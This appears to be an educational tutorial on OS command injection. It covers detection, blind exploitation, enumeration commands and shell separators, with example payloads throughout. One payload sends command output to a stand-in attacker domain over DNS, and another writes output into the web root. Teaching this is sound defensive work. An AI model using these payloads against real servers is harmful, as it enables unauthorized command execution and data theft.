# OS Command Injection

OS Command Injection (also known as **Shell Injection**) is a web security vulnerability that allows an attacker to execute operating system commands on the server that is running an application.

This occurs when user input is passed to a system shell without proper validation or sanitization.

Successful exploitation may allow attackers to execute arbitrary commands on the server.

### Impact

- Execute arbitrary operating system commands
- Access sensitive files on the server
- Retrieve system information
- Compromise application data
- Pivot to other systems within the infrastructure

---

## Detection

OS command injection vulnerabilities typically occur when **user input is used as part of a system command**.

Indicators include:

- Parameters used for **system utilities**
- File operations
- Network utilities
- Image processing
- Backup scripts
- System monitoring commands

Example vulnerable request:

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Server-side command:

```
stockreport.pl 381 29
```

If user input is not validated, attackers can inject commands.

Example payload:

```
& echo test &
```

Injected command executed by server:

```
stockreport.pl & echo test & 29
```

If the output contains `test`, the application is vulnerable.

---

## OS Command Injection Types

### In-band OS Command Injection

In this type, the output of the injected command is returned in the HTTP response.

Example payload:

```
1|whoami
```

Response may reveal the current system user.

---

### Blind OS Command Injection

Blind OS command injection occurs when the application executes the command but **does not return the output in the HTTP response**.

Attackers must use alternative techniques to confirm exploitation.

---

## Useful Commands for Enumeration

After confirming command injection, attackers often run commands to gather system information.

| Purpose | Linux | Windows |
| --- | --- | --- |
| Current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |

---

## Detecting Blind OS Command Injection

### Time Delay Technique

Attackers can inject commands that delay the server response.

Example payload:

```
& ping -c 10 127.0.0.1 &
```

If the application response is delayed, the command was executed.

---

## Exploiting Blind OS Command Injection

### Output Redirection

The output of the command can be redirected to a file inside the web root.

Example payload:

```
& whoami > /var/www/static/whoami.txt &
```

The attacker can then retrieve the file through the browser.

Example request:

```
https://vulnerable-website.com/whoami.txt
```

---

### Out-of-Band (OAST) Techniques

Attackers can force the server to interact with an external system they control.

Example payload:

```
& nslookup attacker-domain.com &
```

If the attacker receives the DNS request, the vulnerability is confirmed.

---

### Out-of-Band Data Exfiltration

The attacker can exfiltrate command output through DNS.

Example payload:

```
& nslookup `whoami`.attacker-domain.com &
```

The DNS request will contain the command output.

---

## Command Injection Operators

Shell metacharacters are used to chain commands.

### Cross-platform separators

```
&
&&
|
||
```

### Unix-only separators

```
;
\n
```

### Inline command execution (Unix)

```
`command`
$(command)
```

These allow attackers to inject additional commands into the original system command.

---

## Quoted Context Injection

Sometimes user input is placed inside quotation marks in the original command.

Example:

```
ping "USER_INPUT"
```

Attackers must break out of the quoted context before injecting commands.

Example payload:

```
"; whoami
```